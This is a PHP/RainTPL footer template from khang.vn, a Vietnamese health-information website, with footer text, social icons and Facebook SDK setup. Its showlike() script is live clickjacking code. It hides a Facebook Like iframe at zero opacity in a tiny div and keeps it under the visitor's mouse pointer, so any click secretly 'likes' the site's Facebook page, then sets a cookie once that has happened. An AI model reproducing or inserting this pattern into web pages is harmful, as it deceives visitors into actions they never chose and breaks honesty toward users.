<?php if(!class_exists('raintpl')){exit;}?><div id="footer">
    <div id="footer-main">
        <h3 class="text-thin text-uppercase color-base no-margin">khang.vn - trang thông tin y tế sức khỏe, tư vấn khám chữa bệnh, tra cứu dữ liệu y tế hàng đầu Việt Nam</h3>
        <p class="text-left">
            Khang.vn mang đến thông tin thời sự về sức khỏe, đời sống y tế cập nhật trong ngày. Ngoài ra khang.vn
            còn cung cấp một thư viện kiến thức về các bệnh thường gặp, bệnh truyền nhiễm, bệnh nhiệt đới, trang bị cho bạn
            những hiểu biết cơ bản để phòng tránh một số bệnh thường gặp, giúp bạn giao tiếp và nhận được tư vấn từ các bác sĩ
            chuyên môn cũng như những chia sẻ kinh nghiệm từ cộng đồng người dùng khang.vn
        </p>
    </div>
    <div id="footer-footer">
        <div id="footer-footer-main">
            <div class="footer-top">
                <em class="text-left pull-left">2007 - 2014 &copy; Khang Team </em>
                <ul class="pull-right list-inline">
                    <li>
                        <a href="#"><span class="icon-facebook"><i class="fa fa-facebook"></i></span></a>
                    </li>
                    <li>
                        <a href="#"><span class="icon-twitter"><i class="fa fa-twitter"></i></span></a>
                    </li>
                    <li>
                        <a href="#"><span class="icon-youtube"><i class="fa fa-youtube"></i></span></a>
                    </li>
                </ul>
            </div>
            <hr/>
            <div class="footer-bottom">
                <span>Cẩm nang sức khỏe Khang.vn</span>
                <div class="info-khang">
                    <span>Liên hệ : hotro.khang.vn@gmail.com</span>
                    <span>Trang thông tin điện tử đang chờ giấy phép của Bộ VHTT</span>
                </div>

            </div>
        </div>
    </div>

    <div id="anatomy-image-preload" style="width:1px;height:1px;overflow: hidden">
        <img src="/themes/pc/img/nam-truoc.jpg" alt=""/>
        <img src="/themes/pc/img/nam-sau.jpg" alt=""/>
        <img src="/themes/pc/img/nu-truoc.jpg" alt=""/>
        <img src="/themes/pc/img/nu-sau.jpg" alt=""/>
    </div>
</div>
<div id="overlay"></div>
<div id="fb-root"></div>
<script lang="javascript">
    (function() {var _h1= document.getElementsByTagName("title")[0] || false;
        var product_name = ""; if(_h1){product_name= _h1.textContent || _h1.innerText;}var ga = document.createElement("script"); ga.type = "text/javascript";
        ga.src = "//live.vnpgroup.net/js/web_client_box.php?hash=5fae10239172918a62dab2e4d330c339&data=eyJoYXNoIjoiODY5ZmViOWVhOWYxOGViZDNlNDhhNmZhMDQ3NjdkMWMiLCJzc29faWQiOjExM30-&pname="+product_name;
        var s = document.getElementsByTagName("script");s[0].parentNode.insertBefore(ga, s[0]);})();
</script>
<div id="fbl-btn" style="position: absolute;width : 5px;height: 5px;overflow: hidden">
    <iframe id="idfacebook" style="position: absolute;left:-105px;top:-32px;"
            src="//www.facebook.com/plugins/likebox.php?href=https://www.facebook.com/suckhoeankhang&amp;width&amp;layout=button&amp;action=like&amp;show_faces=false&amp;share=false&amp;height=35&amp;appId=1561038610796934"
            scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:35px;"
            allowTransparency="true"></iframe>
</div>
<script>
    window.fbAsyncInit = function () {
        // init the FB JS SDK
        FB.init({
            appId: '1561038610796934',                        // App ID from the app dashboard
            status: true,                                 // Check Facebook Login status
            xfbml: true,                                  // Look for social plugins on the page
            version    : 'v2.0'
        });
        FB.getLoginStatus(function (response) {
            if (response.status == 'not_authorized' || response.status == 'connected') {
                showlike();
                //console.log(response.status);
            }
        });
    };


    function showlike() {
        var opacity = 0;
        var faceLike = $.cookie("fVisitor");
        var likes = $("#fbl-btn");
        if (faceLike == 1) {

        } else {
            $(document).mousemove(function (e) {
                likes.css({'left': (e.pageX - 3) + 'px', 'top': (e.pageY - 3) + 'px', 'opacity':opacity})
                if ($(document.activeElement).attr('id') == "idfacebook") {
                    $.cookie("fVisitor", 1, {expires: 1, path: '/'});
                    likes.remove();
                    if (window.addEventListener) {
                        document.removeEventListener("mousemove", mouse, false);
                    }
                    else if (window.attachEvent) {
                        document.detachEvent("onmousemove", mouse);
                    }
                }
            });
        }
    }
</script>